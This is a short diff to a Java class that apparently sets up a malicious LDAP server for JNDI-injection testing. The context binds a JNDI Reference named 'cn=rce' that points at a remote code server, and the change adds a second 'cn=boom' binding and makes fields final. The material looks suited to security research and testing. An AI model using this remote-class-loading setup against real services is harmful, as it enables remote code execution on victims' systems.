@@ -11,9 +11,9 @@ import java.util.List;
 
 public class LdapServerUploader {
 
-    private Context ctx;
-    private String ldapserver;
-    private String refserver;
+    private final Context ctx;
+    private final String ldapserver;
+    private final String refserver;
 
     public LdapServerUploader() throws NamingException {
 
@@ -78,6 +78,6 @@ public class LdapServerUploader {
         Reference ref = new Reference("ExternalObject", "ExternalObject", refserver + "/code/");
         ctx.bind("cn=rce", ref);
 
-
+        ctx.bind("cn=boom",new String[][]{new String[]{"a"}});
     }
 }
